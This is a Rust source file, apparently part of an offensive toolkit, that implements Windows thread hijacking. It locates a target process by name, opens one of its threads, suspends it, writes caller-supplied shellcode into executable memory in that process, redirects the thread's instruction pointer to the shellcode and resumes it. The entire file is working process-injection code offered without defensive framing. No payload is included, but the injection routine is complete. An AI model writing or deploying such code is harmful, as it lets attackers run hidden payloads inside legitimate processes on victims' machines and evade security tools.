// Thread Hijacking
// Hijacks an existing thread in a legitimate process to execute payload

use winapi::um::winnt::*;
use winapi::um::processthreadsapi::*;
use winapi::um::memoryapi::*;
use winapi::um::handleapi::*;
use winapi::um::tlhelp32::*;
use winapi::um::errhandlingapi::*;
use winapi::shared::minwindef::*;
use std::ptr;
use std::ffi::CString;

/// Find a thread in a target process
pub unsafe fn find_thread_in_process(
    process_id: u32,
) -> Result<HANDLE, String> {
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snapshot == INVALID_HANDLE_VALUE {
        return Err(format!("Failed to create snapshot: {}", GetLastError()));
    }
    
    let mut thread_entry = THREADENTRY32 {
        dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
        ..Default::default()
    };
    
    if Thread32First(snapshot, &mut thread_entry) == 0 {
        CloseHandle(snapshot);
        return Err("Failed to get first thread".to_string());
    }
    
    loop {
        if thread_entry.th32OwnerProcessID == process_id {
            let thread_handle = OpenThread(
                THREAD_ALL_ACCESS,
                0,
                thread_entry.th32ThreadID,
            );
            
            CloseHandle(snapshot);
            
            if thread_handle.is_null() {
                return Err(format!("Failed to open thread: {}", GetLastError()));
            }
            
            return Ok(thread_handle);
        }
        
        if Thread32Next(snapshot, &mut thread_entry) == 0 {
            break;
        }
    }
    
    CloseHandle(snapshot);
    Err("No thread found in target process".to_string())
}

/// Hijack thread to execute payload
pub unsafe fn hijack_thread(
    thread_handle: HANDLE,
    process_handle: HANDLE,
    shellcode: &[u8],
) -> Result<(), String> {
    // Step 1: Suspend thread
    let suspend_count = SuspendThread(thread_handle);
    if suspend_count == u32::MAX {
        return Err(format!("Failed to suspend thread: {}", GetLastError()));
    }
    
    // Step 2: Get thread context
    let mut context = CONTEXT {
        ContextFlags: CONTEXT_FULL,
        ..Default::default()
    };
    
    if GetThreadContext(thread_handle, &mut context) == 0 {
        ResumeThread(thread_handle); // Resume before returning
        return Err(format!("Failed to get thread context: {}", GetLastError()));
    }
    
    // Step 3: Allocate memory in target process
    let allocated = VirtualAllocEx(
        process_handle,
        ptr::null_mut(),
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    
    if allocated.is_null() {
        ResumeThread(thread_handle);
        return Err(format!("Failed to allocate memory: {}", GetLastError()));
    }
    
    // Step 4: Write shellcode to target process
    let mut bytes_written = 0usize;
    if WriteProcessMemory(
        process_handle,
        allocated,
        shellcode.as_ptr() as *const winapi::ctypes::c_void,
        shellcode.len(),
        &mut bytes_written,
    ) == 0 {
        VirtualFreeEx(process_handle, allocated, 0, MEM_RELEASE);
        ResumeThread(thread_handle);
        return Err(format!("Failed to write shellcode: {}", GetLastError()));
    }
    
    // Step 5: Modify thread context to point to shellcode
    #[cfg(target_arch = "x86_64")]
    {
        context.Rip = allocated as u64;
    }
    
    #[cfg(target_arch = "x86")]
    {
        context.Eip = allocated as u32;
    }
    
    if SetThreadContext(thread_handle, &context) == 0 {
        VirtualFreeEx(process_handle, allocated, 0, MEM_RELEASE);
        ResumeThread(thread_handle);
        return Err(format!("Failed to set thread context: {}", GetLastError()));
    }
    
    // Step 6: Resume thread (shellcode will execute)
    let resume_count = ResumeThread(thread_handle);
    if resume_count == u32::MAX {
        return Err(format!("Failed to resume thread: {}", GetLastError()));
    }
    
    Ok(())
}

/// Find process by name
pub unsafe fn find_process_by_name(
    process_name: &str,
) -> Result<(HANDLE, u32), String> {
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snapshot == INVALID_HANDLE_VALUE {
        return Err(format!("Failed to create snapshot: {}", GetLastError()));
    }
    
    let mut process_entry = PROCESSENTRY32 {
        dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
        ..Default::default()
    };
    
    if Process32First(snapshot, &mut process_entry) == 0 {
        CloseHandle(snapshot);
        return Err("Failed to get first process".to_string());
    }
    
    let name_cstr = CString::new(process_name)
        .map_err(|_| "Invalid process name".to_string())?;
    
    loop {
        let entry_name = std::ffi::CStr::from_ptr(process_entry.szExeFile.as_ptr() as *const i8)
            .to_string_lossy();
        
        if entry_name == process_name {
            let process_handle = OpenProcess(
                PROCESS_ALL_ACCESS,
                0,
                process_entry.th32ProcessID,
            );
            
            CloseHandle(snapshot);
            
            if process_handle.is_null() {
                return Err(format!("Failed to open process: {}", GetLastError()));
            }
            
            return Ok((process_handle, process_entry.th32ProcessID));
        }
        
        if Process32Next(snapshot, &mut process_entry) == 0 {
            break;
        }
    }
    
    CloseHandle(snapshot);
    Err(format!("Process '{}' not found", process_name))
}

/// Complete thread hijacking workflow
pub unsafe fn hijack_thread_in_process(
    process_name: &str,
    shellcode: &[u8],
) -> Result<(), String> {
    // Find target process
    let (process_handle, process_id) = find_process_by_name(process_name)?;
    
    // Find thread in process
    let thread_handle = find_thread_in_process(process_id)?;
    
    // Hijack thread
    let result = hijack_thread(thread_handle, process_handle, shellcode);
    
    // Cleanup
    CloseHandle(thread_handle);
    CloseHandle(process_handle);
    
    result
}
